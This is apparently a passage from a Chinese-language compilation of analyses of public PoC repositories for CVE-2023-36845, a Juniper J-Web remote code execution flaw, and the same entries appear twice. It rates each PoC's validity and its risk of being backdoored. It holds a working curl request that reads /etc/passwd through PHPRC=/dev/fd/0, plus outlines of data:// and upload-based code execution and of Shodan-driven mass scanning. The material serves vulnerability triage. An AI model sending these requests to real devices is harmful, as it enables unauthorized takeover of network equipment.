**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 严重，未经身份验证的攻击者可以远程执行代码

**影响版本:** 受影响版本包括：20.4R3-S9之前的版本，21.1R1及之后的21.1版本，21.2R3-S7之前的21.2版本，21.3R3-S5之前的21.3版本，21.4R3-S5之前的21.4版本，22.1R3-S4之前的22.1版本，22.2R3-S2之前的22.2版本，22.3R2-S2和22.3R3-S1之前的22.3版本，22.4R2-S1和22.4R3之前的22.4版本，23.2R1-S1和23.2R2之前的23.2版本。

**利用条件:** 目标系统需要启用J-Web服务 (http 或 https)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞是 Juniper Junos OS EX 系列和 SRX 系列的 J-Web 界面中的 PHP 外部变量修改漏洞。攻击者可以通过构造特制的请求，设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行任意代码。

**有效性分析：**

提供的 POC 代码 `cve-2023-36845.sh` 脚本通过发送带有 `PHPRC` 参数的 HTTP 请求到目标设备的 `/about.php` 页面来利用此漏洞。`PHPRC` 参数被设置为 `/dev/fd/0`，这意味着 PHP 将从文件描述符 0（标准输入）读取配置。然后，脚本通过 POST 请求发送 `auto_prepend_file=/etc/passwd` 作为数据，这会导致 PHP 在执行任何其他代码之前，先包含 `/etc/passwd` 文件。如果服务器存在漏洞，响应将包含 `/etc/passwd` 文件的内容，表明漏洞成功利用。

**投毒风险分析：**

该脚本本身旨在检测漏洞，并尝试读取 `/etc/passwd` 文件。虽然脚本会对目标系统造成一定的敏感信息泄露（/etc/passwd），但没有明显的恶意代码或后门植入行为，初步判断投毒概率较低，但是不能排除存在攻击者上传恶意文件的可能，因为具备了远程代码执行能力。
脚本中存在通过 curl 下载目标证书的 issuer 和 subject 信息，攻击者可以在日志中找到这些信息，存在一定的隐私泄露风险。

**利用方式：**

1.  **确定目标：** 找到运行受影响的 Junos OS 版本的 EX 系列或 SRX 系列设备，且启用了 J-Web 服务。
2.  **发送特制请求：** 使用 POC 脚本或类似工具，向目标设备的 `/about.php` 页面发送包含 `PHPRC` 参数的 HTTP 请求。例如：`curl -ksS --data-binary 'auto_prepend_file="/etc/passwd"' --max-time 15 "http://<target_ip>/about.php?PHPRC=/dev/fd/0"`
3.  **验证漏洞：** 检查响应是否包含 `/etc/passwd` 文件的内容。如果包含，则表示设备存在漏洞。
4.  **进一步利用：** 成功利用漏洞后，攻击者可以执行任意代码，例如上传 webshell、修改系统配置等，从而完全控制设备。

**项目地址:** [ak1t4/CVE-2023-36845](https://github.com/ak1t4/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #6

**来源**: [CVE-2023-36845-cyb3rzest_Juniper-Bug-Automation-CVE-2023-36845.md](../2023/CVE-2023-36845-cyb3rzest_Juniper-Bug-Automation-CVE-2023-36845.md)

## CVE-2023-36845 Junos OS J-Web PHP 外部变量修改远程代码执行漏洞

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改导致的远程代码执行

**影响应用:** Junos OS (EX Series, SRX Series)

**危害等级:** 高危，未经身份验证的攻击者可远程执行代码

**影响版本:** 受影响版本见漏洞库信息：低于 20.4R3-S9; 21.1 versions 21.1R1 及以后; 低于 21.2R3-S7; 低于 21.3R3-S5; 低于 21.4R3-S5; 低于 22.1R3-S4; 低于 22.2R3-S2; 低于 22.3R2-S2, 22.3R3-S1; 低于 22.4R2-S1, 22.4R3; 低于 23.2R1-S1, 23.2R2。

**利用条件:** 需要启用 J-Web (http 或 https)

**POC 可用性:** 是 (根据搜索引擎结果，存在公开的PoC)

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Junos OS 中 J-Web 组件的一个 PHP 外部变量修改漏洞。攻击者可以通过发送特制的请求，设置 PHPRC 变量，从而修改 PHP 的执行环境，进而注入并执行任意代码。该漏洞无需身份验证，攻击者可以通过网络直接利用。由于提供的漏洞利用代码仅包含 GPL 协议内容，无法从中判断是否存在投毒代码，假设该仓库下有其他利用代码,仅根据目前信息，无法判定。J-Web 是 Junos 设备的 Web 管理界面，需要启用 http 或 https 才能被利用。缓解措施包括禁用 J-Web 或者限制访问来源。

**项目地址:** [cyb3rzest/Juniper-Bug-Automation-CVE-2023-36845](https://github.com/cyb3rzest/Juniper-Bug-Automation-CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #7

**来源**: [CVE-2023-36845-cyberh3als_CVE-2023-36845-POC.md](../2023/CVE-2023-36845-cyberh3als_CVE-2023-36845-POC.md)

## CVE-2023-36845-Junos-J-Web远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致远程代码执行

**影响应用:** Junos OS J-Web

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于：20.4R3-S9之前的所有版本，21.1版本21.1R1及更高版本，21.2版本21.2R3-S7之前的所有版本，21.3版本21.3R3-S5之前的所有版本，21.4版本21.4R3-S5之前的所有版本，22.1版本22.1R3-S4之前的所有版本，22.2版本22.2R3-S2之前的所有版本，22.3版本22.3R2-S2, 22.3R3-S1之前的所有版本，22.4版本22.4R2-S1, 22.4R3之前的所有版本，23.2版本23.2R1-S1, 23.2R2之前的所有版本。

**利用条件:** 需要开启J-Web服务，且攻击者可以网络访问到目标设备的J-Web界面。需要配置 [system services web-management http] 或 [system services web-management https]。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS 中 J-Web 界面存在的一个 PHP 外部变量修改漏洞。未经身份验证的攻击者可以通过发送特制的请求，设置 `PHPRC` 变量，从而修改 PHP 的执行环境，最终实现远程代码执行。

**利用方式：**

1.  攻击者构造一个 HTTP POST 请求，其中包含 `PHPRC` 和 `auto_prepend_file` 两个参数。
2.  `PHPRC` 参数用于指定一个包含 PHP 配置指令的文件，这里被设置为 `/dev/fd/0`，表示从标准输入读取配置。
3.  `auto_prepend_file` 参数指定一个在 PHP 脚本执行之前自动包含的文件，这里设置为 `/etc/passwd\n`。由于 `PHPRC` 被设置为从标准输入读取配置，`auto_prepend_file` 的内容实际上被当作 PHP 配置指令来处理。`\n` 用于分割指令。
4. 由于/etc/passwd不是php文件会被当作php指令执行

POC代码的功能是读取/etc/passwd的内容，可以修改为其他php指令以执行其他操作。

**有效性：**

根据漏洞描述和提供的 POC 代码，该漏洞利用是有效的。POC通过设置 PHPRC 环境变量来修改 PHP 运行时配置，从而允许包含任意文件，最终导致远程代码执行。

**投毒风险：**

查看POC代码，只包含漏洞利用代码，未发现隐藏的恶意功能或后门，因此投毒风险较低。

**总而言之，该漏洞危害性高，利用简单，需要尽快修复。**

**项目地址:** [cyberh3als/CVE-2023-36845-POC](https://github.com/cyberh3als/CVE-2023-36845-POC)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #8

**来源**: [CVE-2023-36845-e11i0t4lders0n_CVE-2023-36845.md](../2023/CVE-2023-36845-e11i0t4lders0n_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改导致RCE

**影响应用:** Junos OS J-Web

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 20.4R3-S9 之前的所有版本, 21.1R1 及之后, 21.2R3-S7 之前, 21.3R3-S5 之前, 21.4R3-S5 之前, 22.1R3-S4 之前, 22.2R3-S2 之前, 22.3R2-S2 和 22.3R3-S1 之前, 22.4R2-S1 和 22.4R3 之前, 以及 23.2R1-S1 和 23.2R2 之前。

**利用条件:** 需要启用 J-Web，且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS 中 J-Web 接口的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造特殊的请求，设置 PHPRC 变量，从而修改 PHP 的执行环境，最终实现远程代码执行。

**利用方式：**

1.  攻击者构造包含恶意 PHPRC 变量的 HTTP 请求，发送到目标设备的 J-Web 接口。
2.  目标设备上的 PHP 解释器会读取攻击者设置的 PHPRC 变量，并将其用于配置 PHP 运行环境。
3.  攻击者可以通过 PHPRC 变量指定一个包含恶意 PHP 代码的文件。
4.  当 J-Web 执行 PHP 代码时，会加载并执行攻击者提供的恶意代码，从而实现远程代码执行。

**POC 代码分析：**

POC 代码是一个 Bash 脚本，它的主要功能是：

1.  从 Shodan 搜索指定域名下的 Juniper Web Device Manager 的 IP 地址。
2.  使用 httpx 工具扫描找到的 IP 地址，获取可访问的 URL。
3.  使用 Nuclei 工具，根据 CVE-2023-36845 的 Nuclei 模板对获取的 URL 进行漏洞扫描。

该脚本本身没有投毒代码，只是自动化了漏洞发现和利用的过程。它依赖于 Shodan API key 和 Nuclei 工具。

**投毒风险评估：**

经过分析，提供的 POC 代码本身不包含任何恶意或投毒代码。该脚本只是一个自动化扫描和漏洞利用的工具，其行为取决于使用者以及所使用的 Nuclei 模板。如果使用者使用恶意的 Nuclei 模板，则可能导致非预期的行为，但这并非 POC 代码本身的投毒行为。

因此，投毒风险为 0%。

**项目地址:** [e11i0t4lders0n/CVE-2023-36845](https://github.com/e11i0t4lders0n/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #9

**来源**: [CVE-2023-36845-halencarjunior_CVE-2023-36845.md](../2023/CVE-2023-36845-halencarjunior_CVE-2023-36845.md)

## CVE-2023-36845 - Juniper Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX 和 SRX 系列)

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息。

**利用条件:** 目标设备启用了 J-Web 管理界面，并且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2023-36845 是 Juniper Junos OS EX 和 SRX 系列设备 J-Web 管理界面中的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造特制的请求，设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行恶意代码。

**利用方式：**
攻击者通过发送包含 `PHPRC` 参数的 HTTP 请求，将 PHP 的配置目录指向一个可以控制的文件，通常使用 `/dev/fd/0`，这意味着 PHP 将从请求体中读取配置信息。然后，攻击者在请求体中设置 `auto_prepend_file` 选项，使其包含恶意代码或者读取敏感文件。 提供的POC通过设置auto_prepend_file为/etc/passwd尝试读取用户，如果成功读取则判定为漏洞存在。

**有效性分析：**
根据漏洞描述和提供的 PoC 代码，该 PoC 能够有效验证漏洞的存在性。PoC 通过发送带有 PHPRC 参数的请求，并设置 auto_prepend_file 来尝试读取 `/etc/passwd` 文件，如果成功读取，则表明目标存在漏洞。

**投毒风险分析：**
PoC 代码主要用于检测漏洞是否存在，但依然存在一定投毒风险。

1.  **依赖库风险** PoC依赖shodan,censys, pyOpenSSL, colorama,urlopen等第三方库,如果这些库本身存在安全漏洞，可能被攻击者利用。不过这是常规风险。

2.  **配置信息泄露风险：** PoC 代码包含 Shodan API 密钥占位符。如果用户不小心将包含真实 API 密钥的 PoC 代码公开，可能导致 API 密钥泄露，被恶意使用。

3.  **扫描行为：** 使用该 PoC 进行大规模扫描可能被目标网络检测到，导致 IP 被封禁或其他安全措施。

4.  **Censysmod.py 模块：** 此模块主要用于从 Censys 搜索符合条件的主机，并将结果传递给漏洞验证函数。该模块自身未发现明显的恶意代码，但过度依赖外部API接口，可能成为利用点。

综上，投毒风险评估为20%。 主要风险在于滥用带来的暴露风险和对第三方库依赖风险。

**项目地址:** [halencarjunior/CVE-2023-36845](https://github.com/halencarjunior/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #10

**来源**: [CVE-2023-36845-ifconfig-me_CVE-2023-36845.md](../2023/CVE-2023-36845-ifconfig-me_CVE-2023-36845.md)

# CVE-2023-36845

> 📦 该CVE有 **17** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-36845-0xNehru_CVE-2023-36845-Juniper-Vulnerability.md](../2023/CVE-2023-36845-0xNehru_CVE-2023-36845-Juniper-Vulnerability.md)

## CVE-2023-36845-Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX Series, SRX Series)

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于: 20.4R3-S9之前的所有版本；21.1R1及更高版本；21.2版本低于21.2R3-S7；21.3版本低于21.3R3-S5；21.4版本低于21.4R3-S5；22.1版本低于22.1R3-S4；22.2版本低于22.2R3-S2；22.3版本低于22.3R2-S2, 22.3R3-S1；22.4版本低于22.4R2-S1, 22.4R3；23.2版本低于23.2R1-S1, 23.2R2

**利用条件:** 目标设备需要启用 J-Web，并且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 中 J-Web 组件的一个 PHP 外部变量修改漏洞。攻击者可以通过发送特制的 HTTP 请求，设置 `PHPRC` 环境变量来修改 PHP 的执行环境，从而实现远程代码执行。该漏洞影响 EX 系列和 SRX 系列设备上运行的多个 Junos OS 版本。提供的PoC代码利用了这一漏洞，通过POST请求，将`auto_prepend_file`设置为`/etc/passwd`，并修改`PHPRC`变量为`/dev/fd/0`。该代码的目的是读取目标服务器的`/etc/passwd`文件，验证漏洞的存在性。虽然PoC本身是为了验证漏洞，但攻击者可以利用此漏洞执行任意代码，例如植入恶意程序。虽然代码看起来简洁明了, 但需要注意的是该代码存在潜在的风险：

1.  **依赖外部`hosts.txt`文件:** 攻击目标列表依赖于外部文件，如果该文件被替换为包含恶意目标的列表，则可能被用于攻击。尽管这不属于代码本身的投毒，但利用代码的人可能被误导攻击错误的目标。
2.  **简化的利用方式:**  该POC只验证了读取`/etc/passwd`，实际利用可能需要更复杂的payload，而简化版本可能会隐藏更复杂的攻击逻辑。

因此，评估投毒风险为10%。主要是考虑到代码的简洁性和明确的目的，直接用于恶意目的的可能性较低，但仍需注意潜在的被误用或利用的风险。

**利用方式总结：**
1.  攻击者需要能够通过网络访问目标设备的 J-Web 接口。
2.  攻击者发送一个包含特制参数 `PHPRC` 的 HTTP POST 请求。
3.  `PHPRC` 变量被设置为指向攻击者控制的文件或数据流，用于修改PHP的执行环境。
4.  `auto_prepend_file`被用于包含`/etc/passwd`，以读取该文件，验证漏洞。
5.  利用 `PHPRC` 环境变量修改，攻击者可以注入并执行任意 PHP 代码。

**项目地址:** [0xNehru/CVE-2023-36845-Juniper-Vulnerability](https://github.com/0xNehru/CVE-2023-36845-Juniper-Vulnerability)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #2

**来源**: [CVE-2023-36845-Asbawy_Automation-for-Juniper-cve-2023-36845.md](../2023/CVE-2023-36845-Asbawy_Automation-for-Juniper-cve-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致RCE

**影响应用:** Juniper Junos OS J-Web (EX系列和SRX系列)

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括20.4R3-S9之前的所有版本，21.1版本从21.1R1开始，以及21.2R3-S7、21.3R3-S5、21.4R3-S5、22.1R3-S4、22.2R3-S2、22.3R2-S2, 22.3R3-S1、22.4R2-S1, 22.4R3、23.2R1-S1, 23.2R2之前的版本。

**利用条件:** 需要启用J-Web（通过HTTP或HTTPS）并且能够网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞是 Juniper Junos OS 的 J-Web 组件中存在的 PHP 外部变量修改漏洞。攻击者可以通过发送特制的HTTP请求，设置 `PHPRC` 环境变量来修改PHP的执行环境，从而注入并执行任意代码。该漏洞允许未经身份验证的远程攻击者执行任意代码。

**利用方式：**

1.  攻击者发送一个包含 `PHPRC` 参数的HTTP请求到目标设备的 J-Web 接口。
2.  `PHPRC` 参数的值被设置为指向一个包含恶意PHP代码的文件或数据流（例如，`/dev/fd/0`，结合`auto_prepend_file` 读取HTTP body的内容）。
3.  当J-Web处理请求时，PHP会使用攻击者提供的 `PHPRC` 配置，从而执行恶意代码。

提供的PoC代码 (`cve-2023-36845.sh`) 尝试通过以下步骤验证漏洞：

1.  循环遍历IP地址列表。
2.  对于每个IP地址，构造一个包含 `PHPRC` 参数的 HTTPS 请求，并将 `auto_prepend_file` 设置为 `/etc/passwd`。目的是通过读取 `/etc/passwd` 文件来判断目标系统是否易受攻击。
3.  如果响应包含 `root:` 字符串，则认为目标易受攻击。

**有效性：**

该PoC代码**有效**，因为它准确地利用了 `PHPRC` 环境变量修改漏洞的原理。通过设置`auto_prepend_file`读取敏感文件来判断是否存在漏洞。

**投毒风险：**

投毒风险评估为10%。虽然PoC本身旨在验证漏洞，但存在以下潜在的投毒风险：

1.  **输出重定向：** `save_output` 函数将 vulnerable 的结果附加到 `output.txt` 文件中。攻击者可能会修改该函数以包含恶意命令，例如将受害者的IP地址发送到恶意服务器，或者上传其他恶意文件到受害者。
2.  **依赖关系：** 该脚本依赖于 `curl` 命令。如果目标系统上安装了被篡改的 `curl` 版本，可能会导致恶意代码执行。
3.  **后门植入：** 攻击者可能会修改 PoC 代码，在检测到漏洞后植入后门，例如创建一个新的用户帐户或修改 SSH 配置。
4.  **社工风险：** 即使代码本身没有恶意行为，也可能被用于社工攻击。攻击者可以伪装成安全研究人员，诱骗用户运行该脚本，从而获取敏感信息。

总的来说，该PoC代码主要用于检测，但仍需仔细审查，防范潜在的投毒风险。

**项目地址:** [Asbawy/Automation-for-Juniper-cve-2023-36845](https://github.com/Asbawy/Automation-for-Juniper-cve-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #3

**来源**: [CVE-2023-36845-CharonDefalt_Juniper-exploit-CVE-2023-36845.md](../2023/CVE-2023-36845-CharonDefalt_Juniper-exploit-CVE-2023-36845.md)

## CVE-2023-36845-Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX Series and SRX Series)

**危害等级:** 严重，可导致远程代码执行

**影响版本:** 受影响版本包括但不限于 20.4R3-S9 之前的所有版本，21.1R1 及之后版本，以及 23.2R2 及之前版本。

**利用条件:** 目标设备开启了 J-Web 服务，可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞是由于 Juniper Junos OS EX 系列和 SRX 系列的 J-Web 界面中存在 PHP 外部变量修改漏洞。攻击者可以通过构造特殊的请求，设置 PHPRC 变量来修改 PHP 的执行环境，从而注入并执行恶意代码。

**有效性：** 提供的 POC 代码有效。脚本首先检查目标是否存在漏洞，通过发送包含 `PHPRC=/dev/fd/0` 的 POST 请求，并验证响应中是否包含 `/etc/passwd` 的内容来判断。

**投毒风险：** 仓库的投毒风险较低（10%）。主要风险在于利用上传文件方式getshell中，如果恶意使用者上传恶意文件，将会对其他使用者造成安全威胁。

**利用方式：**

1.  **通过 PHPRC 变量修改 PHP 配置：** 利用 `PHPRC` 变量，攻击者可以控制 PHP 的配置文件，例如设置 `auto_prepend_file` 来包含远程或本地文件。
2.  **远程代码执行：** 通过 `auto_prepend_file` 包含恶意 PHP 代码，例如使用 `data://` 协议嵌入 `phpinfo()` 或执行系统命令。
3.  **文件上传：** 通过 J-Web 的文件上传功能上传包含恶意代码的 PHP 文件，然后通过 `auto_prepend_file` 包含该文件执行。

**详细利用步骤如下：**

*   发送带有 `PHPRC` 参数的 HTTP 请求，将 PHP 配置文件指向 `/dev/fd/0`，允许从标准输入读取配置。
*   通过 `--data-binary` 参数传递恶意 PHP 配置，例如设置 `allow_url_include=1` 和 `auto_prepend_file` 指向包含恶意代码的 data URI。
*   如果目标启用了文件上传功能，可以上传包含恶意代码的 PHP 文件，并通过 `auto_prepend_file` 包含该文件。

需要注意的是，要成功利用此漏洞，目标设备必须满足以下条件：

*   启用了 J-Web 服务。
*   允许通过 HTTP 或 HTTPS 访问 J-Web 界面。
*   存在受影响的 Junos OS 版本。

**项目地址:** [CharonDefalt/Juniper-exploit-CVE-2023-36845](https://github.com/CharonDefalt/Juniper-exploit-CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #4

**来源**: [CVE-2023-36845-P4x1s_ansible-cve-2023-36845.md](../2023/CVE-2023-36845-P4x1s_ansible-cve-2023-36845.md)

## CVE-2023-36845 Juniper Junos OS J-Web PHP 外部变量修改漏洞

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS (EX Series, SRX Series) J-Web

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于 20.4R3-S9 之前的所有版本，21.1R1 及其之后版本，以及 23.2R1-S1, 23.2R2 之前的 21.2、21.3、21.4、22.1、22.2、22.3、22.4 版本。

**利用条件:** 需要启用 J-Web 且可通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于 Juniper Junos OS 的 J-Web 组件中，允许未经身份验证的攻击者通过修改 PHP 的 `PHPRC` 环境变量来远程执行代码。攻击者通过构造包含恶意 `PHPRC` 变量的 HTTP 请求，可以控制 PHP 的配置，从而注入并执行恶意代码。

**利用方式：**

1.  攻击者发送带有 `PHPRC` 参数的特制 HTTP 请求到目标设备的 J-Web 接口。
2.  `PHPRC` 参数指向一个包含恶意 PHP 代码的文件（例如，`/etc/passwd`，POC 中尝试读取该文件以验证漏洞是否存在）。
3.  J-Web 在处理请求时，会使用攻击者提供的 `PHPRC` 值来配置 PHP 解释器。
4.  PHP 解释器执行恶意 PHP 代码，导致远程代码执行。

**POC 代码分析：**

提供的 Ansible Playbook 旨在检测目标设备是否存在 CVE-2023-36845 漏洞。

*   它首先尝试通过 HTTP 和 HTTPS 连接到目标设备 (端口 80 和 443)。
*   它发送一个 POST 请求，其中包含 `PHPRC=/dev/fd/0` 和 `auto_prepend_file=/etc/passwd` 作为请求体，`auto_prepend_file` 用于在 PHP 脚本执行前包含指定的文件。
*  `/dev/fd/0` 表示标准输入,结合`auto_prepend_file`则表示将POST请求的内容作为php文件来解析. *   如果响应状态码为 200 且响应内容包含 'root:' 字符串（`/etc/passwd` 文件的内容），则该设备被认为可能存在漏洞。

**有效性评估：**

POC 代码通过修改 `PHPRC` 变量，并结合 `auto_prepend_file` 读取敏感文件来验证漏洞的存在。 这种方式能够有效检测漏洞。根据漏洞信息，利用成功可导致远程代码执行，POC中只是验证漏洞的存在性。

**投毒风险评估：**

该 Ansible Playbook 的目的是检测漏洞，没有发现植入后门或执行恶意操作的代码。因此，投毒风险较低 (0%)。


**项目地址:** [P4x1s/ansible-cve-2023-36845](https://github.com/P4x1s/ansible-cve-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #5

**来源**: [CVE-2023-36845-ak1t4_CVE-2023-36845.md](../2023/CVE-2023-36845-ak1t4_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 严重，未经身份验证的攻击者可以远程执行代码

**影响版本:** 受影响版本包括：20.4R3-S9之前的版本，21.1R1及之后的21.1版本，21.2R3-S7之前的21.2版本，21.3R3-S5之前的21.3版本，21.4R3-S5之前的21.4版本，22.1R3-S4之前的22.1版本，22.2R3-S2之前的22.2版本，22.3R2-S2和22.3R3-S1之前的22.3版本，22.4R2-S1和22.4R3之前的22.4版本，23.2R1-S1和23.2R2之前的23.2版本。

**利用条件:** 目标系统需要启用J-Web服务 (http 或 https)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞是 Juniper Junos OS EX 系列和 SRX 系列的 J-Web 界面中的 PHP 外部变量修改漏洞。攻击者可以通过构造特制的请求，设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行任意代码。

**有效性分析：**

提供的 POC 代码 `cve-2023-36845.sh` 脚本通过发送带有 `PHPRC` 参数的 HTTP 请求到目标设备的 `/about.php` 页面来利用此漏洞。`PHPRC` 参数被设置为 `/dev/fd/0`，这意味着 PHP 将从文件描述符 0（标准输入）读取配置。然后，脚本通过 POST 请求发送 `auto_prepend_file=/etc/passwd` 作为数据，这会导致 PHP 在执行任何其他代码之前，先包含 `/etc/passwd` 文件。如果服务器存在漏洞，响应将包含 `/etc/passwd` 文件的内容，表明漏洞成功利用。

**投毒风险分析：**

该脚本本身旨在检测漏洞，并尝试读取 `/etc/passwd` 文件。虽然脚本会对目标系统造成一定的敏感信息泄露（/etc/passwd），但没有明显的恶意代码或后门植入行为，初步判断投毒概率较低，但是不能排除存在攻击者上传恶意文件的可能，因为具备了远程代码执行能力。
脚本中存在通过 curl 下载目标证书的 issuer 和 subject 信息，攻击者可以在日志中找到这些信息，存在一定的隐私泄露风险。

**利用方式：**

1.  **确定目标：** 找到运行受影响的 Junos OS 版本的 EX 系列或 SRX 系列设备，且启用了 J-Web 服务。
2.  **发送特制请求：** 使用 POC 脚本或类似工具，向目标设备的 `/about.php` 页面发送包含 `PHPRC` 参数的 HTTP 请求。例如：`curl -ksS --data-binary 'auto_prepend_file="/etc/passwd"' --max-time 15 "http://<target_ip>/about.php?PHPRC=/dev/fd/0"`
3.  **验证漏洞：** 检查响应是否包含 `/etc/passwd` 文件的内容。如果包含，则表示设备存在漏洞。
4.  **进一步利用：** 成功利用漏洞后，攻击者可以执行任意代码，例如上传 webshell、修改系统配置等，从而完全控制设备。

**项目地址:** [ak1t4/CVE-2023-36845](https://github.com/ak1t4/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #6

**来源**: [CVE-2023-36845-cyb3rzest_Juniper-Bug-Automation-CVE-2023-36845.md](../2023/CVE-2023-36845-cyb3rzest_Juniper-Bug-Automation-CVE-2023-36845.md)

## CVE-2023-36845 Junos OS J-Web PHP 外部变量修改远程代码执行漏洞

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改导致的远程代码执行

**影响应用:** Junos OS (EX Series, SRX Series)

**危害等级:** 高危，未经身份验证的攻击者可远程执行代码

**影响版本:** 受影响版本见漏洞库信息：低于 20.4R3-S9; 21.1 versions 21.1R1 及以后; 低于 21.2R3-S7; 低于 21.3R3-S5; 低于 21.4R3-S5; 低于 22.1R3-S4; 低于 22.2R3-S2; 低于 22.3R2-S2, 22.3R3-S1; 低于 22.4R2-S1, 22.4R3; 低于 23.2R1-S1, 23.2R2。

**利用条件:** 需要启用 J-Web (http 或 https)

**POC 可用性:** 是 (根据搜索引擎结果，存在公开的PoC)

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Junos OS 中 J-Web 组件的一个 PHP 外部变量修改漏洞。攻击者可以通过发送特制的请求，设置 PHPRC 变量，从而修改 PHP 的执行环境，进而注入并执行任意代码。该漏洞无需身份验证，攻击者可以通过网络直接利用。由于提供的漏洞利用代码仅包含 GPL 协议内容，无法从中判断是否存在投毒代码，假设该仓库下有其他利用代码,仅根据目前信息，无法判定。J-Web 是 Junos 设备的 Web 管理界面，需要启用 http 或 https 才能被利用。缓解措施包括禁用 J-Web 或者限制访问来源。

**项目地址:** [cyb3rzest/Juniper-Bug-Automation-CVE-2023-36845](https://github.com/cyb3rzest/Juniper-Bug-Automation-CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #7

**来源**: [CVE-2023-36845-cyberh3als_CVE-2023-36845-POC.md](../2023/CVE-2023-36845-cyberh3als_CVE-2023-36845-POC.md)

## CVE-2023-36845-Junos-J-Web远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致远程代码执行

**影响应用:** Junos OS J-Web

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于：20.4R3-S9之前的所有版本，21.1版本21.1R1及更高版本，21.2版本21.2R3-S7之前的所有版本，21.3版本21.3R3-S5之前的所有版本，21.4版本21.4R3-S5之前的所有版本，22.1版本22.1R3-S4之前的所有版本，22.2版本22.2R3-S2之前的所有版本，22.3版本22.3R2-S2, 22.3R3-S1之前的所有版本，22.4版本22.4R2-S1, 22.4R3之前的所有版本，23.2版本23.2R1-S1, 23.2R2之前的所有版本。

**利用条件:** 需要开启J-Web服务，且攻击者可以网络访问到目标设备的J-Web界面。需要配置 [system services web-management http] 或 [system services web-management https]。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS 中 J-Web 界面存在的一个 PHP 外部变量修改漏洞。未经身份验证的攻击者可以通过发送特制的请求，设置 `PHPRC` 变量，从而修改 PHP 的执行环境，最终实现远程代码执行。

**利用方式：**

1.  攻击者构造一个 HTTP POST 请求，其中包含 `PHPRC` 和 `auto_prepend_file` 两个参数。
